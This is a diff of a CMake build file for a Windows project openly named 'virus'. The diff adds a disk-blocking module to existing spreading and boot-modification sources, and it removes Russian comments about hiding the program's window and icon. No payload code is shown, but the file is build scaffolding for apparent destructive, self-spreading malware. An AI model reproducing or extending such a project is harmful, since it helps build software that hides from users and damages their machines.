@@ -6,7 +6,6 @@ set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wall -Werror")
 set(CMAKE_CXX_FLAGS_RELEASE "/O2 /MT")
 set(CMAKE_CXX_FLAGS_DEBUG "/Od /MTd")
 
-# Устанавливаем консольное приложение, но скрываем окно
 set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /SUBSYSTEM:WINDOWS")
 
 add_executable(virus
@@ -18,9 +17,9 @@ add_executable(virus
     spread.cpp
     openrand.cpp
     bootmod.cpp
+    diskblock.cpp  # НОВЫЙ ФАЙЛ
 )
 
-# Линкуем необходимые библиотеки
 target_link_libraries(virus
     user32
     kernel32
@@ -32,15 +31,12 @@ target_link_libraries(virus
     oleaut32
 )
 
-# Включаем поддержку файловой системы (C++17)
 target_compile_definitions(virus PRIVATE _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING)
 
-# Указываем, что приложение должно быть статически слинковано с CRT
 set_target_properties(virus PROPERTIES
     LINK_FLAGS "/NODEFAULTLIB:libcmt /DEFAULTLIB:libcmt"
 )
 
-# Добавляем ресурсы (иконка для скрытия)
 if(WIN32)
     add_custom_command(TARGET virus POST_BUILD
         COMMAND echo. > ${CMAKE_BINARY_DIR}/empty.rc
